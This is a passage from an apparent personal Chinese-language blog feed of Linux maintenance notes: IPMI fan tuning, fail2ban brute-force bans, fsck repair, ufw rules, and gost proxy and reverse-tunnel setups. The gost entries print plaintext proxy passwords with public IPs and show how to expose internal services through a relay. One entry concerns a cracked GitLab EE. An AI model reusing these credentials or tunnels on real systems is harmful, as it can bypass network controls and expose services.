alt="2024-04-10-21-58-11"></p><p>通过调整发现，转速确实低了，之前一直稳定在20%-25%（5000+转）左右，功耗大概在170w。通过调低风扇转速，不仅静音了，还降低了功耗。<br>PS：1、不是永久设置，服务器关闭电源，再次插上电源则需要重新调整。<br>2、如果是跑应用，为了防止烧显卡，建议直接100%<br>3、配置一下邮件预警，当温度到达一定程度，主动发送邮件</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>写个脚本，使用ipmitool实时获取cpu和gpu温度，当超过阈值，调用ipmitool自动调速</p><p>错误</p><pre><code>Error: Unable to establish IPMI v2 / RMCP+ session</code></pre><p>原因：<br>1、用户名或者密码错误<br>2、未启用ipml</p><p>解决：</p><p>1、设置密码：<br>Menu Overview -&gt; IDRAC SETTINGS -&gt; User Authentication<br>-&gt; Click on the userID of your admin account -&gt; Next<br>-&gt; check “change your password” checkbox and enter the same (or new) password<br>-&gt; Apply</p><p>2、启动ipml</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-22-00-30.png" alt="2024-04-10-22-00-30"></p><p>测试命令：</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-22-01-26.png" alt="2024-04-10-22-01-26"></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>boot after 1m30s</title>
      <link href="/2024/04/08/Linux-Maintain/boot_slower_1m30/"/>
      <url>/2024/04/08/Linux-Maintain/boot_slower_1m30/</url>
      
        <content type="html"><![CDATA[<p>开机启动1m30s慢</p><p>Ubuntu开机卡在 A start job is runing for wait for Network to be configured (1min 23s / no limit)解决方法</p><p>参考链接：<a href="https://blog.csdn.net/weixin_42300866/article/details/123712774">https://blog.csdn.net/weixin_42300866/article/details/123712774</a></p><pre><code>root@k8s-master1:~# cd /etc/systemd/system/network-online.target.wants/root@k8s-master1:/etc/systemd/system/network-online.target.wants# lltotal 8drwxr-xr-x  2 root root 4096 Aug 24  2021 ./drwxr-xr-x 19 root root 4096 Mar 24 08:11 ../lrwxrwxrwx  1 root root   56 Aug 16  2021 systemd-networkd-wait-online.service -&gt; /lib/systemd/system/systemd-networkd-wait-online.service</code></pre><p>添加内容如下：<br>在【service】代码快最末尾加上</p><pre><code>TimeoutStartSec=2sec</code></pre><p>修改内容如下：</p><pre><code>#  SPDX-License-Identifier: LGPL-2.1+##  This file is part of systemd.##  systemd is free software; you can redistribute it and/or modify it#  under the terms of the GNU Lesser General Public License as published by#  the Free Software Foundation; either version 2.1 of the License, or#  (at your option) any later version.[Unit]Description=Wait for Network to be ConfiguredDocumentation=man:systemd-networkd-wait-online.service(8)DefaultDependencies=noConflicts=shutdown.targetRequires=systemd-networkd.serviceAfter=systemd-networkd.serviceBefore=network-online.target shutdown.target[Service]Type=oneshotExecStart=/lib/systemd/systemd-networkd-wait-onlineRemainAfterExit=yesTimeoutStartSec=2sec[Install]WantedBy=network-online.target</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fail2ban</title>
      <link href="/2024/04/08/Linux-Maintain/fail2ban/"/>
      <url>/2024/04/08/Linux-Maintain/fail2ban/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#fail2ban禁止爆破">fail2ban：禁止爆破</a></li><li><a href="#fail2ban-client">fail2ban-client</a></li><li><a href="#实战自定义web系统django封禁404或者爆破问题">实战：自定义WEB系统django封禁404或者爆破问题</a></li></ul><p>2024年4月8日，我和其他前端同事合作开发的考试系统，mysql数据库被黑，宕机。</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-05-54.png" alt="2024-04-09-21-05-54"></p><p>随后我禁止公网暴露mysql数据库，开始研究对其他网络协议的防止暴力破解，于是使用fail2ban对sshd和http的爆破进行限制。</p><h1 id="fail2ban：禁止爆破"><a href="#fail2ban：禁止爆破" class="headerlink" title="fail2ban：禁止爆破"></a>fail2ban：禁止爆破</h1><p>参考链接：<a href="https://www.myfreax.cominstall-configure-fail2ban-on-ubuntu-20-04/">https://www.myfreax.cominstall-configure-fail2ban-on-ubuntu-20-04/</a></p><p>fail2ban是根据你配置好的日志文件，和jail服务，来临时ban ip的，<strong>如果需要永久拒绝某个ip，直接操作防火墙ufw更合适</strong>。fail2ban只能根据配置好的jail_name来临时ban ip.</p><p>直接日志位置: /var/log/fail2ban.log</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-03-27.png" alt="2024-04-09-21-03-27.png"></p><pre><code>apt update &amp;&amp; apt install fail2ban</code></pre><p>在默认情况下是禁用的，因为它的一些默认设置可能会导致不良效果。</p><pre><code>systemctl status fail2banfail2ban.service - Fail2Ban Service    Loaded: loaded (/lib/systemd/system/fail2ban.service; disabled; vendor preset: enabled)    Active: inactive (dead)    Docs: man:fail2ban(1)</code></pre><p>配置目录：/etc/fail2ban</p><p>默认有jail.conf的配置文件，但是<strong>不要动conf</strong>，自己新建.local的配置文件在local中编辑：</p><pre><code>cp /etc/fail2ban/jail.&#123;conf,local&#125;</code></pre><p>jail.local中有三个重要的</p><pre><code>bantime  = 1d  findtime  = 10m  maxretry = 5</code></pre><p>Fail2ban附带许多Jail作为示例，系统每一项服务都可以找到对应Jail配置。 要启用Jail，您需要在添加enabled = true。 以下示例显示了如何为sshd服务启用Jail：</p><pre><code>[sshd]enabled   = true（ubunt可以不写）port    = sshlogpath = %(sshd_log)sbackend = %(sshd_backend)s/etc/fail2ban/jail.local</code></pre><p>每次修改配置文件时，都必须重新启动Fail2ban服务，以使更改生效：</p><pre><code>sudo systemctl restart fail2ban</code></pre><h1 id="fail2ban-client"><a href="#fail2ban-client" class="headerlink" title="fail2ban-client"></a>fail2ban-client</h1><p>检查fail2ban监视的sshd：</p><pre><code>fail2ban-client status sshd</code></pre><p>unban ip：</p><pre><code>fail2ban-client set sshd unbanip 23.34.45.56</code></pre><p>banIP：</p><pre><code>fail2ban-client set sshd banip 23.34.45.56</code></pre><p>我自己爆破sshd测试了下，这里一次ssh有3次重试密码机会，然后jail写的5次，这里其实测试的时候输错了15次密码，才会被fail2ban认为是要ban的ip。</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-07-36.png" alt="2024-04-09-21-07-36"></p><h1 id="实战：自定义WEB系统django封禁404或者爆破问题"><a href="#实战：自定义WEB系统django封禁404或者爆破问题" class="headerlink" title="实战：自定义WEB系统django封禁404或者爆破问题"></a>实战：自定义WEB系统django封禁404或者爆破问题</h1><p>我是用uwsgi启用的django，日志文件与格式如下：</p><pre><code>/var/log/uwsgi/uwsgi.log[pid: 799467|app: 0|req: 36/44] 129.151.212.54 () &#123;40 vars in 544 bytes&#125; [Tue Apr  9 07:44:07 2024] POST /api/login/ =&gt; generated 41 bytes in 244 msecs (HTTP/1.1 304) 7 headers in 267 bytes (1 switches on core 0)[pid: 799467|app: 0|req: 37/45] 129.151.212.54 () &#123;40 vars in 543 bytes&#125; [Tue Apr  9 07:44:10 2024] POST /api/login/ =&gt; generated 41 bytes in 263 msecs (HTTP/1.1 304) 7 headers in 267 bytes (1 switches on core 0)</code></pre><p>可以看到登录接口响应304，</p><p>然后，网络做法通常为使用 正则表达式 测试看是否能匹配到日志中测试数据：<br>但是此处有坑点，日志中有非标准格式行，会直接报错IndexError: string index out of range。这个问题仅仅是fail2ban-regex本身这种小测试工具的问题。</p><pre><code>fail2ban-regex /var/log/uwsgi/uwsgi.log  &quot;&lt;HOST&gt; \(.*\) .* \(HTTP/[012.]+ [345][0-9][0-9]\)&quot;</code></pre><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-08-29.png" alt="2024-04-09-21-08-29"></p><p>此时为了测试，需要把测试数据完整行单独放如/var/log/uwsgi/uwsgi.log2 的文件中测试正则。</p><p><img src="/2024/04/08/Linux-Maintain/fail2ban/2024-04-09-21-08-48.png" alt="2024-04-09-21-08-48"></p><p>说明测试通过。</p><p>新建jail，自行命名</p><pre><code>vim /etc/fail2ban/jail.d/jail_uwsgi.local[uwsgi]enabled = trueport = 8000protocol = tcpfilter = uwsgilogpath = /var/log/uwsgi/uwsgi.logbantime = 120mfindtime = 10mmaxretry = 15</code></pre><p>新建filter，自行命名</p><pre><code>vim /etc/fail2ban/filter.d/uwsgi.conf[Definition]failregex = &lt;HOST&gt; \(.*\) .* \(HTTP/[012.]+ [345][0-9][0-9]\)ignoreregex =</code></pre><hr><pre><code>/etc/fail2ban/jail.local (不要编辑jail.conf)一众配置中新增如下：[uwsgi]# 此处jail.d定义和本初jail.local的参数可互相迭代指定，此处可仅写个[uwsgi]而不写配置参数（因为我的方法，在jail中已写）</code></pre><p>重启fail2ban</p><pre><code>systemctl restart fail2ban</code></pre><p>自己在本地打15个304的HTTP请求包后，可以看到自己的IP在 uwsgi 的jail 中被ban：</p><pre><code>root@racknerd-c012d0:/etc/fail2ban/jail.d# fail2ban-client status uwsgiStatus for the jail: uwsgi|- Filter|  |- Currently failed: 0|  |- Total failed:     15|  `- File list:        /var/log/uwsgi/uwsgi.log`- Actions|- Currently banned: 1|- Total banned:     1`- Banned IP list:   129.151.212.54root@racknerd-c012d0:/etc/fail2ban/jail.d# fail2ban-client status sshdStatus for the jail: sshd|- Filter|  |- Currently failed: 2|  |- Total failed:     6|  `- File list:        /var/log/auth.log`- Actions|- Currently banned: 3|- Total banned:     3`- Banned IP list:   218.92.0.122 218.92.0.22 218.92.0.29</code></pre><p>postman此时由于触发ban，发送仅响应503 service unresposable, 触发ufw的reject行为</p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fsck：强行重启系统导致分区出现问题</title>
      <link href="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/"/>
      <url>/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/</url>
      
        <content type="html"><![CDATA[<p>参考链接： </p><pre><code>http://c.biancheng.net/view/887.htmlhttps://www.linuxprobe.com/linux-fsck-command.htmlhttps://cloud.tencent.com/developer/article/1721746</code></pre><p>fsck修复的问题，主要是磁盘无法启动、由于强制断电等造成文件IO错误、磁盘内容错误一类的（解决的是修复磁盘的问题）</p><h1 id="常见的5种损坏类型"><a href="#常见的5种损坏类型" class="headerlink" title="常见的5种损坏类型"></a>常见的5种损坏类型</h1><pre><code>1 未被引用的inode2 难以置信的超大链接数3 没有记录在磁盘块映射表中的未用数据快4 列出的空闲数据快还在某个文件中便用5 超级块中不正确的汇总信息</code></pre><p>在使用 fsck 命令修改某文件系统时，<strong>这个文件系统对应的磁盘分区一定要处于卸载状态</strong>，磁盘分区在挂载状态下进行修复是非常不安全的，<strong>数据可能会遭到破坏，也有可能会损坏磁盘</strong>。</p><p>常见做法，是对格式化的磁盘进行修复。<strong>注意不能修复已挂载的磁盘,否则会导致永久性损伤磁盘。需要先umount磁盘，在fsck进行修复。</strong></p><p>推荐命令：</p><pre><code>fsck -r /dev/sdb1</code></pre><p>情景：我虚拟机卡死的情况下无奈重启电脑，重新打开虚拟机后，发现屏幕上报错如下：</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-08-50.png" alt="2024-04-10-22-08-50"></p><p>我虚拟机的磁盘使用了LVM进行分配，然后由于上述原因出问题了。可以看到某个Inode出现了问题（给出了逻辑block和物理block的位置），然后虚拟机自行进入了busybox的命令中，要求手动进行检测。</p><p>这里因为磁盘有问题，linux的OS没有对该磁盘进行挂载，而是使用了busybox进行修复，所以你会发现能用的命令都很少，因为OS没有挂载磁盘，你无法执行bin下命令。可以看到目前你执行的shell是（initramfs），是类似于Win PE一样的内存OS，而非磁盘。</p><p>因为我这里涉及到lvm的修复，故参考<a href="https://www.cnblogs.com/xiangsikai/p/10684828.html">https://www.cnblogs.com/xiangsikai/p/10684828.html</a><br>我执行lvm进入lvm操作，然后执行lvdisplay看到lv Path的路径</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-09-24.png" alt="2024-04-10-22-09-24"></p><p>随后fsck /dev/ubuntu-vg/ubuntu-lv 进行修复<br>一路Y即可</p><p><img src="/2024/04/08/Linux-Maintain/fsck_boot_force_fdisk_err/2024-04-10-22-09-54.png" alt="2024-04-10-22-09-54"></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gost</title>
      <link href="/2024/04/08/Linux-Maintain/gost/"/>
      <url>/2024/04/08/Linux-Maintain/gost/</url>
      
        <content type="html"><![CDATA[<p>项目参考<br><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p><h1 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h1><p>只要本地客户端执行-L，就可以转发http，https，socks等协议的转发，但是实测我无法https转发，会遇到证书的报错</p><h3 id="kcp协议：-udp封装的协议"><a href="#kcp协议：-udp封装的协议" class="headerlink" title="kcp协议： udp封装的协议"></a>kcp协议： udp封装的协议</h3><pre><code>server:gost -L kcp://gost:1qaz@WSX@45.77.115.252:52783client:gost -L=:6666 -F=kcp://gost:1qaz@WSX@45.77.115.252:52783</code></pre><h3 id="mwss协议：多媒体协议"><a href="#mwss协议：多媒体协议" class="headerlink" title="mwss协议：多媒体协议"></a>mwss协议：多媒体协议</h3><pre><code>server:./gost -L mwss://fivecolorstone:fivecolorstone@192.210.xxx.99:29753gost -L mwss://fivecolorstone:fivecolorstone@45.77.115.252:29723client:gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@192.210.xxx.99:29753gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@45.77.115.252:29723</code></pre><h1 id="curl挂代理检测socks代理"><a href="#curl挂代理检测socks代理" class="headerlink" title="curl挂代理检测socks代理"></a>curl挂代理检测socks代理</h1><p>curl -x socks5://127.0.0.1:1024 <a href="http://www.google.com">http://www.google.com</a> # -x 参数等同于 —proxy</p><p>访问ip.sb会直接显示当前你连接的ip</p><pre><code>curl -x socks5://127.0.0.1:6666 ip.sb</code></pre><h1 id="在racknerd的socks的vps搭建的坑点"><a href="#在racknerd的socks的vps搭建的坑点" class="headerlink" title="在racknerd的socks的vps搭建的坑点"></a>在racknerd的socks的vps搭建的坑点</h1><p>如果是AlmaLinux，则使用yum安装 net-tools 等软件<br>防火墙不同于ubuntu的ufw，使用firewalld</p><p>需要关闭firewalld：</p><pre><code>systemctl stop firewalldsystemctl disable firewalld</code></pre><p>在如下链接中找到解决方案：<br><a href="https://almalinux.discourse.group/t/no-match-for-argument-screen/790">https://almalinux.discourse.group/t/no-match-for-argument-screen/790</a></p><pre><code>dnf install epel-releasednf install screen</code></pre><p>然后再 screen -S gost开screen的shell，运行命令<br>mwss协议：</p><pre><code>server:./gost -L mwss://fivecolorstone:fivecolorstone@192.227.xxx.113:39753client:gost -L=:6666 -F=mwss://fivecolorstone:fivecolorstone@192.227.xxx.113:39753</code></pre><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>参考帖子：<br><a href="https://github.com/ginuerzh/gost/issues/745">https://github.com/ginuerzh/gost/issues/745</a></p><p>假设A地址是公网vps，B是某内网服务器，C是客户端<br>B、C不能访问，C想访问B的5000端口的服务，需要以A为中继，gost部署如下：</p><p>A部署：</p><pre><code>gost -L socks5://:2345 (意思是，建立端口为2345的gost服务端。2345仅是服务端，用来gost访问搭桥的，不是让人类访问的)</code></pre><p>B部署：</p><pre><code>gost -L rtcp://:8080/:5000 -F socks5://10.80.5.244:2345 (意思是，将机器192.168.217.128端口5000绑定到机器10.80.5.244端口8080上。此处rtcp无所谓，gost支持的都行)</code></pre><p>C访问：</p><pre><code>访问 A:8080，就可以访问到B:5000 了。</code></pre><h3 id="案例：将gitea内网穿透"><a href="#案例：将gitea内网穿透" class="headerlink" title="案例：将gitea内网穿透"></a>案例：将gitea内网穿透</h3><p>服务端（192.227.167.113）：</p><pre><code>./gost -L socks5://:38441</code></pre><p>被穿透机器：</p><pre><code>gost -L rtcp://:3001/:3000 -F socks5://192.227.xxx.113:38441</code></pre><p>访问：<br><a href="http://192.227.167.113:3001/">http://192.227.167.113:3001/</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gitlab-ee的破解版返回500，501响应</title>
      <link href="/2024/04/08/Linux-Maintain/gitlab-ee%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%89%88%E8%BF%94%E5%9B%9E500%EF%BC%8C501%E5%93%8D%E5%BA%94/"/>
      <url>/2024/04/08/Linux-Maintain/gitlab-ee%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%89%88%E8%BF%94%E5%9B%9E500%EF%BC%8C501%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p>鹏哥参考过的链接</p><pre><code>https://docs.gitlab.com/ee/install/docker.html#devshm-mount-not-having-enough-space-in-docker-containerhttps://blog.kelu.org/tech/2021/12/16/docker-shm.htmlhttps://blog.csdn.net/weixin_43545410/article/details/120963125</code></pre><h1 id="方法一：容器启动前修改"><a href="#方法一：容器启动前修改" class="headerlink" title="方法一：容器启动前修改"></a>方法一：容器启动前修改</h1><pre><code>docker run -it --shm-size=&quot;1g&quot; --name 001 busybox:latest /bin/sh</code></pre><h1 id="方法二：容器启动后修改"><a href="#方法二：容器启动后修改" class="headerlink" title="方法二：容器启动后修改"></a>方法二：容器启动后修改</h1><p>1.docker ps | grep containerName</p><p>2.获取完整 Id</p><pre><code>[root@linfs-bigdata containers]# docker inspect 641ae8c59c0d | grep Id    &quot;Id&quot;: &quot;641ae8c59c0d20814d489cdc17a32f6ab3f35e621e5f67c2e0df1cc1b7efa269&quot;,</code></pre><p>3.修改 ShmSize，单位为 kb，默认大小为 64M，修改完后重启 docker 就生效了</p><pre><code>vim /var/lib/docker/containers/641ae8c59c0d20814d489cdc17a32f6ab3f35e621e5f67c2e0df1cc1b7efa269/hostconfig.json</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ufw</title>
      <link href="/2024/04/08/Linux-Maintain/ufw/"/>
      <url>/2024/04/08/Linux-Maintain/ufw/</url>
      
        <content type="html"><![CDATA[<p>firewall和ufw，两者安装其一即可，都安装的话会冲突。</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p>iptables 是一个通过控制 Linux 内核的 netfilter 模块来管理网络数据包的流动与转送的应用软件，其功能包括不仅仅包括防火墙的控制出入流量，还有端口转发等等。</p><p>iptables 内部有表 tables、链 chains、规则 rules 这三种概念。<br>iptables 的每一个 “表” 都和不同的数据包处理有关、决定数据包是否可以穿越的是 “链”、而一条 “规则” 在链里面则可以决定是否送往下一条链（或其它的动作）。</p><p>iptables 是 firewall 和 ufw 的底层。</p><h1 id="firewalld"><a href="#firewalld" class="headerlink" title="firewalld"></a>firewalld</h1><p>如almaLinux、centos使用 firewalld 为防火墙，区别于 ubuntu 的ufw作为防火墙。</p><p>关闭防火墙可以使用systemctl stop firewalld 和 systemctl disable firewalld 。</p><pre><code>firewall-cmd --permanent --add-port=51080/tcp[root@vultr ~]# firewall-cmd --list-ports50022/tcp 51080/tcp 38388/tcp 38388/udp 23307/tcp</code></pre><h1 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h1><p>UFW（Uncomplicated Firewal）是 Ubuntu 下基于 iptables 的接口，旨在简化配置防火墙的过程。默认情况下 UFW 为关闭状态，开启时默认为拒绝所有传入链接，并允许所有传出连接。只有root权限才能操作</p><pre><code>ufw status verbose</code></pre><p>打印拒绝连接的地址，和开放的端口、关闭的端口</p><p>UFW防火墙的默认行为是<strong>阻止所有传入和转发流量</strong>，并<strong>允许所有出站流量</strong>。这意味着除非您打开指定的端口，否则任何尝试访问您的服务器的人都将无法连接。</p><pre><code>sudo ufw allow sshsudo ufw enable</code></pre><p>将会启用ubuntu防火墙，并提示你命令可能会中断SSH的连接是否要进行该操作</p><p>打开端口，如果未给出协议，则UFW会同时为tcp和udp创建规则：</p><pre><code>ufw allow port_number/protocol</code></pre><p>如果写协议名字的话，ufw会检查<strong>/etc/services</strong>中对应指定的服务和端口</p><p>UFW还允许您打开指定的端口范围。起始端口和结束端口用冒号:分隔，并且您必须指定协议tcp或udp。</p><p>例如，如果要同时在tcp和udp允许来自7100到7200端口的连接，则可以运行命令</p><pre><code>sudo ufw allow 7100:7200/tcp。</code></pre><p>指定端口号最常用的方式例如命令sudo ufw allow 80将会打开80端口。UFW还支持使用proto关键字指定协议。</p><pre><code>sudo ufw allow 80 #tcp和udpsudo ufw allow 80/tcp #仅tcpsudo ufw allow proto tcp to any port 80</code></pre><h3 id="允许源IP地址接口-网卡"><a href="#允许源IP地址接口-网卡" class="headerlink" title="允许源IP地址接口/网卡"></a>允许源IP地址接口/网卡</h3><p>如果只写协议（如 http ssh），会检查/etc/services对应端口来封端口</p><p>要允许来自指定源IP的连接，请使用from关键字，后跟源地址。如果要仅允许指定的IP地址访问指定的端口，请使用to any port关键字，后跟端口号</p><pre><code>sudo ufw allow from 192.168.1.100 #仅允许单IP地址sudo ufw allow from 192.168.1.100 to any port 3306 #仅允许单IP地址连接3306sudo ufw allow from 192.168.1.0/24 to any port 3306sudo ufw allow in on eth2 to any port 3306ufw allow sshufw allow 7722/tcp</code></pre><h3 id="拒绝连接"><a href="#拒绝连接" class="headerlink" title="拒绝连接"></a>拒绝连接</h3><p>所有传入连接的默认策略均设置为deny，如果您未更改默认策略，除非打开指定端口的连接，否则UFW会阻止所有传入连接。</p><p>撰写拒绝规则与撰写允许规则相同。使用deny关键字而不是allow。假设打开了端口80和443，并且服务器受到23.24.25.0/24网络的攻击。要拒绝来自23.24.25.0/24的所有连接。</p><pre><code>sudo ufw deny from 23.24.25.0/24</code></pre><p>命令将会拒绝23.24.25.0/24网段的连接，如果你仅需要拒绝指定IP地址的连接，则不需要添加子网掩码。</p><p>你还可以拒绝指定的IP地址连接到指定的端口，例如命令sudo ufw deny proto tcp from 23.24.25.0/24 to any port 80,443。将会拒绝23.24.25.0/24访问端口80和443的示例</p><pre><code>deny：    当使用 deny 动作时，防火墙会默默地丢弃被拒绝的数据包，而不向源发送任何响应。    对于 TCP 连接，源主机将继续尝试发送数据包，直到达到超时或放弃为止。    这种动作会使得攻击者难以确定目标主机是否在线，因为他们不会收到拒绝连接的响应。    但这也可能导致一些问题，比如可能会使得攻击者更难以确定是由于网络故障还是被防火墙拒绝。reject：    当使用 reject 动作时，防火墙会发送一条 ICMP 错误消息（如“目标不可达”）给源主机，通知其连接被拒绝。    对于 TCP 连接，这将导致源主机立即收到拒绝连接的响应，从而不再尝试建立连接。    与 deny 不同，使用 reject 动作会立即通知源主机连接被拒绝，这样可以更快地释放网络资源并减少攻击者的网络流量。</code></pre><hr><pre><code>sudo ufw deny from 23.24.25.100 #拒绝指定的IP连接sudo ufw deny from 23.24.25.0/24  #整个网段sudo ufw deny proto tcp from 23.24.25.0/24 to any port 80,443拒绝使用rejectufw reject from 202.54.5.7 to any</code></pre><h3 id="查看并删除防火墙规则"><a href="#查看并删除防火墙规则" class="headerlink" title="查看并删除防火墙规则"></a>查看并删除防火墙规则</h3><pre><code>sudo ufw status numbered</code></pre><p>假设要删除的ufw规则编号是3，该规则号允许连接到端口8080。你可运行命令</p><pre><code>sudo ufw delete 3</code></pre><p>第二种方法是通过指定实际规则来删除规则。例如，如果您打开了8069端口的规则，则可以运行命令sudo ufw delete allow 8069将其删除。</p><pre><code>sudo ufw status numbered #查看防火墙的状态sudo ufw delete 3 #根据编号删除sudo ufw delete allow 8069 通过规则删除规则</code></pre><h3 id="禁用-启用"><a href="#禁用-启用" class="headerlink" title="禁用/启用"></a>禁用/启用</h3><p>如果出于某些原因要停止UFW并停用所有规则，则可以运行命令sudo ufw disable禁用防火墙。</p><p>以后，如果您想重新启用ufw并激活所有规则，运行命令sudo ufw enable即可。</p><p>重置UFW将禁用UFW，并删除所有活动规则。 如果您不想还原所有更改并重新开始，这将很有帮助。要重置UFW，可以运行命令sudo ufw reset。</p><pre><code>sudo ufw disable #禁用sudo ufw enable #开启sudo ufw reset #重置</code></pre><h3 id="IP伪装-转发"><a href="#IP伪装-转发" class="headerlink" title="IP伪装/转发"></a>IP伪装/转发</h3><p>IP伪装是Linux内核中NAT网络地址转换的一种变体，它通过重写源IP地址和目标IP地址端口来转换网络流量。借助IP伪装，您可以使用一台Linux计算机充当网关，允许私有网络中的一台或多台计算机与互联网通信。例如VMware或者Virtualbox此类虚拟软件就是通过一个NAT适配器充当网卡，转发多台虚拟机网络数据，连接到互联网。</p><p>使用UFW配置IP伪装涉及几个步骤。首先，您需要启用IP转发ip_forward。</p><p>请使用你喜欢的编辑器编辑/etc/ufw/sysctl.conf文件，在本教程中将使用vim编辑器打开文件：</p><pre><code>sudo vim /etc/ufw/sysctl.conf</code></pre><p>查找并取消注释以下行：</p><pre><code>net/ipv4/ip_forward=1</code></pre><p>您还需要配置UFW以允许转发数据包。打开UFW配置文件/etc/default/ufw。找到DEFAULT_FORWARD_POLICY键，然后将值从DROP更改为ACCEPT。</p><pre><code>sudo vim /etc/default/ufw</code></pre><h1 id="找到DEFAULT-FORWARD-POLICY改为ACCEPT"><a href="#找到DEFAULT-FORWARD-POLICY改为ACCEPT" class="headerlink" title="找到DEFAULT_FORWARD_POLICY改为ACCEPT"></a>找到DEFAULT_FORWARD_POLICY改为ACCEPT</h1><pre><code>DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</code></pre><p>现在，您需要在nat表中设置POSTROUTING链的默认策略和伪装规则。 请打开/etc/ufw/before.rules文件。</p><pre><code>sudo vim /etc/ufw/before.rules</code></pre><p>追加以下几行到文件/etc/ufw/before.rules</p><pre><code>#NAT table rules 启用nat 表*nat# 允许POSTROUTING 链:POSTROUTING ACCEPT [0:0]# 转发eth0接口的数据包，请将eth0更改为你对应的接口-A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE# don&#39;t delete the &#39;COMMIT&#39; line or these rules won&#39;t be processedCOMMIT</code></pre><p>注意不要删除COMMIT关键词，它永远是在最后一行。别忘了在-A POSTROUTING行中替换eth0以匹配你的计算机可以连接到互联网的名称。</p><p>完成后，保存并关闭文件。最后，通过命令sudo ufw disable禁用和命令sudo ufw enable重新启用UFW重新加载UFW规则。</p><h3 id="systemctl-enable-ufw和ufw-enable区别"><a href="#systemctl-enable-ufw和ufw-enable区别" class="headerlink" title="systemctl enable ufw和ufw enable区别"></a>systemctl enable ufw和ufw enable区别</h3><p>我对这两个命令疑惑，不过有相关的说明：<br><a href="https://unix.stackexchange.com/questions/555020/how-should-i-enable-ufw-through-systemctl-enable-or-ufw-enable">https://unix.stackexchange.com/questions/555020/how-should-i-enable-ufw-through-systemctl-enable-or-ufw-enable</a></p><p>systemctl只是要不要考虑ufw作为系统引导时启动的后台进程。</p><p>ufw本身默认是关着的，systemctl status ufw可以看到ufw是enabled，但是ufw status看到他是inactive，这是不冲突的，要开启ufw需要 ufw enable.</p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>goland技巧</title>
      <link href="/2024/04/08/Go/goland/"/>
      <url>/2024/04/08/Go/goland/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#常用快捷键">常用快捷键</a></li><li><a href="#添加远程调试">添加远程调试</a></li><li><a href="#delve升级go无法调试">delve：升级go无法调试</a></li></ul><h1 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h1><p>打出err.nn可以快速打出 err!=nil</p><h1 id="添加远程调试"><a href="#添加远程调试" class="headerlink" title="添加远程调试"></a>添加远程调试</h1><p>直接调试器这里新建Go构建（不需要点击Go远程）</p><p><img src="/2024/04/08/Go/goland/2024-04-10-22-20-14.png" alt="2024-04-10-22-20-14"></p><p>在这里配置SSH</p><p><img src="/2024/04/08/Go/goland/2024-04-10-22-20-45.png" alt="2024-04-10-22-20-45"></p><h1 id="delve：升级go无法调试"><a href="#delve：升级go无法调试" class="headerlink" title="delve：升级go无法调试"></a>delve：升级go无法调试</h1><p>我升级go从1.17到1.20后，goland无法调试。<br>调试时报错 </p><pre><code>WARNING: undefined behavior - version of Delve is too old for Go version 1.20.0 (maximum supported version 1.18)</code></pre><p>查阅网上很多方法都不奏效。<br>以下为奏效方法：<br><a href="https://zhuanlan.zhihu.com/p/425645473">https://zhuanlan.zhihu.com/p/425645473</a></p><pre><code>$ git clone https://github.com/go-delve/delve$ cd delve$ go install github.com/go-delve/delve/cmd/dlv</code></pre><p>随后在GOPATH/bin中出现最新的dlv.exe，注意看该程序的生成时间<br>然后在goland的“自定义属性”中设置该值：</p><pre><code>dlv.path=E:\\BiLing\\golang-study\\bin\\dlv.exe</code></pre><p>重启goland奏效</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pycharm技巧</title>
      <link href="/2024/04/08/Python/pycharm/"/>
      <url>/2024/04/08/Python/pycharm/</url>
      
